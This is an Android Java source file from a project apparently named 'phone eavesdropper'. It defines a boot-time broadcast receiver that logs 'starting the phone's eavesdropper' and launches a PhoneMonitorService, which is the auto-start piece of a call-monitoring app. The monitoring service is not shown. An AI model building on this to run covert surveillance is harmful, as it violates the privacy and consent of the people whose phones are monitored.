package com.example.luchaojun.dianhuaqietingqi;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

/**
 * Created by luchaojun on 8/15/17.
 */

public class PhoneBootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        System.out.println("开启手机的窃听器");
        Intent intent1 = new Intent(context,PhoneMonitorService.class);
        context.startService(intent1);
    }
}
